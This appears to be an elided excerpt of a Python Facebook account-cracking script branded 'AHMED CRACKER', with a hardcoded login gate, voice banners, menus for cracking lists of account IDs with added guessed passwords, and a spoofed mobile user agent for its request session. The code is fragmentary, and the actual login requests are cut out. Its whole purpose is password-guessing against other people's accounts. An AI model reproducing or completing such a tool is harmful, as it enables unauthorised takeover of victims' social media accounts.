...
while attemps < 12345677901:
    username = input(' \033[1;92mEnter Username =AHMED: ')
    password = input(' \033[1;91mEnter Password =2024 ')
 
    if username == 'AHMED' and password == '2024':
...
os.system('espeak -a 300 " Welcome,   to,  AHMED  King,  Tools"')

time.sleep(1)

os.system('espeak -a 300 " JAlWa chck kr "')
#LOGO
def banner():
	print("""%s
...
[+] thanks      : FARAZ ALI
[+] Girlfriend  : Sakeena Abbasi 
[+] Tool         : FREE BUT TESTING 
\033[1;91m
...
#MENU
def menu():
	os.system('xdg-open https://youtube.com/@ahmedshr64')
	_IPYTHONI_(f'\x1b[1;97m[1] ᴄʀᴀᴄᴋ   ꜰɪʟᴇ   ɪᴅꜱ   ᴀɴᴅ   ᴘᴀꜱꜱᴡᴏʀᴅ   ')
	...
	if _____IPYTHONI_____ in ['1']:
		...
		back()
def error():
	print(f' \x1b[1;91m\x1b[1;96m\x1b[1;97m \x1b[1;91m Menu')
	time.sleep(0)
	back()
#INPUT-FILE
def F():
...
class D:
	...
	def plerr(self):
		...
		try:
			...
			fileX = input ('\x1b[1;97m[+] ɪɴᴘᴜᴛ   ꜰɪʟᴇ   ɴᴀᴍᴇ    : ')
...
def Settings():
	...
	print(f'\033[1;97m[\33[1;97m1\33[1;97m]\33[1;97m[ɪᴛ   ɪꜱ   ꜱᴛᴀʀᴛɪɴɢ   ᴛᴏ   ᴄʀᴀᴄᴋ]\33[1;92m')
	                                                               
	hu = input('\33[1;95m𝙲𝚑𝚘𝚒𝚌𝚎 :\x1b[1;92m ')
	if hu in ['0','00']:
		muda=[]
		...
		print('\033[1;31m[\033[1;32m!\033[1;31m]\033[1;32mWRONG ')
		exit()
	os.system("clear");banner()
	print(f'\033[1;97m[\33[1;97m1\33[1;97m]\33[1;97m    Seven \33[1;92m ')
	os.system('espeak -a 300 " 1,  method,  Seven"')
	hc = input('\33[1;95m𝙲𝚑𝚘𝚒𝚌𝚎 :\x1b[1;92m ')
	if hc in ['1','01']:
		method.append('mobile')
	else:
		methode.append('mobile')
	pwplus=input('\033[1;97m[ 1 ] 𝙽𝙴𝚆 Facebook [𝙶𝙾𝙾𝙳]\n[ 2 ] 𝙽𝙴𝚆 + 𝙾𝙻𝙳 Facebook [𝚅𝙴𝚁𝚈 𝙶𝙾𝙾𝙳]\n\033[1;97m\33[1;95m𝙲𝚑𝚘𝚒𝚌𝚎 :\33[1;92m')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		print(f'Add Password ?mhamad123-mhaad112233')
		pwku=input('\033[1;31m[\033[1;32m•\033[1;31m]\033[1;32mAdd Password ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
	...
	print(f"\x1b[1;97m---------------------------------------------------------------------")
def passwrd():
	print(f"\x1b[1;97m[~] Welcome TO TOOL  AHMED CRACKER")
...
def cek_opsi():
	...
	for kes in akun:
		try:
			...
			ua = 'Mozilla/5.0 (Linux; Android 11; OPPO F9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4755.101 Mobile Safari/537.36'
			ses = requests.Session()
